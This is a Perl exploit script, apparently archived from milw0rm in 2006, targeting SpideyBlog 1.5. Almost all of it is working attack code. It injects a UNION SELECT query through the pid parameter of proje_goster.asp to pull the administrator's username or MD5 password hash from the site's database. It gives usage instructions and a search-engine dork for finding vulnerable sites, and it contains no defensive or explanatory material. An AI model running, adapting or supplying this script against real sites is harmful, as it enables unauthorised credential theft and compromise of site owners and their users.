#!usr/bin/perl

#Author : gega
#Google : "Spidey Blog Script (c) v1.5"
#SpideyBlog 1.5 Sql Injection Exploit
#Author Mail : gega.tr[at]gmail[dot]com
#Powered by e-hack.org
#Vulnerability by Asianeagle.
#Vulnerability Link : http://milw0rm.com/exploits/2186

use LWP::Simple;

print "\n==============================\n";
print "==      Spidey Blog v1.5    ==\n";
print "==   Sql Injection Exploit  ==\n";
print "==        Author : gega     ==\n";
print "==============================\n\n";

if(!$ARGV[0] or !$ARGV[0]=~/http/ or !$ARGV[1] or ($ARGV[1] ne 'password' and $ARGV[1] ne 'nick'))
{
	print "Usage : perl $0 [path] [function]\n";
	print "path ==> http://www.example.com/blog/\n";
	print "function ==> nick OR password\n";
	print "Example : perl $0 http://site.org/blog/ nick\n";
	exit(0);
}
else
{
	if($ARGV[1] eq 'nick'){
		$url=q[proje_goster.asp?pid=-1%20union%20select%200,1,2,3,4,kullanici_adi,6%20from%20uyeler%20where%20id%20like%201];
		$page=get($ARGV[0].$url) || die "[-] Unable to retrieve: $!";
		print "[+] Connected to: $ARGV[0]\n";
		$page=~m/<td width="100%" valign="top" height="19" colspan="3"><span class="normal_yazi">(.*?)<\/span><\/td>/ && print "[+] Username of administrator is: $1\n";
		print "[-] Unable to retrieve username\n" if(!$1); }
	else {
		$code=q[proje_goster.asp?pid=-1%20union%20select%200,1,2,3,4,sifre,6%20from%20uyeler%20where%20id%20like%201];
		$page=get($ARGV[0].$code) || die "[-]Unable to retrieve: $!";
		print "[+] Connected to: $ARGV[0]\n";
		$page=~m/<td width="100%" valign="top" height="19" colspan="3"><span class="normal_yazi">(.*?)<\/span><\/td>/ && print "[+] MD5 hash of password is: $1\n";
		print "[-] Unable to retrieve password\n" if(!$1);
	}
}
 
#To Be Or Not To Be!

# milw0rm.com [2006-09-24]
